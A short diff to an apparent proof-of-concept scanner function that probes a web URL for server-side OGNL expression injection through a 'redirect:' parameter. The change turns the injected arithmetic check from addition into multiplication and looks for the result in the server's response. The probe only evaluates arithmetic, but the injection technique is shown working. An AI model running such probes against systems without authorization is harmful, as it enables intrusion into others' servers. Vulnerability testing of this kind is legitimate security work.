@@ -24,10 +24,10 @@ def poc(url):
     if '://' not in url:
         url = 'http://' + url
     try:
-        a = random.randint(1000, 2000)
-        b = random.randint(1000, 2000)
-        c = a + b
-        url = url + "?redirect:%25{" + "%s}" % str(a+b)
+        a = random.randint(100, 200)
+        b = random.randint(100, 200)
+        c = a * b
+        url = url + "?redirect:%25{" + "%s*%s}" % (str(a), str(b))
         response = requests.get(url=url, headers=header, timeout=5)
         if str(c) in response.text and response.status_code == 404:
         	return True
